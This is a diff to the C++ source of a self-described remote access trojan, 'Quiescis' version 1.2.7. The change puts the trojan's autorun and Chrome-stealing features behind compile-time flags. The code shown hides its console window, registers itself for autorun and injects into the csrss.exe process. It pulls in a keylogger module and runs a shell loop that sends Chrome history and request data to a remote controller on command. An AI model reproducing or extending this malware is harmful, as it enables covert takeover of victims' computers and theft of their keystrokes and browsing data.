@@ -1,5 +1,5 @@
 /*
- * Quiescis Remote Access Trojan 1.2.6
+ * Quiescis Remote Access Trojan 1.2.7
  * WARNING!
  * This software is the full property of the author
  * Not intended for dumb kids
@@ -13,28 +13,31 @@
 #include <fstream>
 #include <string>
 
-#include "Autorun.h"
 #include "Config.h"
+
+#if autorun
+	#include "Autorun.h"
+#endif // autorun
+
 #include "Socket.h"
 #include "Crypt.h"
 #include "Utils.h"
 #include "Info.h"
 #include "Keylogger.h"
-#include "Chrome.h"
-
-#pragma warning(disable: 4996)
-#pragma optimize("gsy", on)
+#if chrome_stealer
+	#include "Chrome.h"
+#endif // chrome_stealer
 
 std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars, finally_msg, n_path;
 
 int Shell(SOCKADDR_IN addr);
 
-
 int main() {
 	// hide console
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	setlocale(LC_ALL, "Russian");
+	setlocale(LC_ALL, lang);
 	// autorun
+#if autorun
 	RegisterProgram();
 	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);
 
@@ -45,8 +48,8 @@ int main() {
 		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
 			GetProcAddress(hKernel, "RegisterServiceProcess");
 	}
-	// end autorun
 
+#endif // end autorun
 	// server configuration start
 	SOCKADDR_IN add = Server();
 	// start kurva
@@ -224,6 +227,7 @@ int Shell(SOCKADDR_IN addr) {
 		}
 
 		else if (!strcmp(buffer, "chrome_st")) {
+#if chrome_stealer
 			std::string res = GetChromeHistory();
 			send(conn, res.c_str(), res.length(), NULL);
 			Sleep(1000);
@@ -232,6 +236,9 @@ int Shell(SOCKADDR_IN addr) {
 			Sleep(1000);
 			std::string res_requests = GetChromeRequests();
 			send(conn, res_requests.c_str(), res_requests.length(), NULL);
+#else
+		send(conn, "not supported", 13, NULL);
+#endif
 		}
 
 		else if (strcmp(buffer, "close") == 0) return 1;
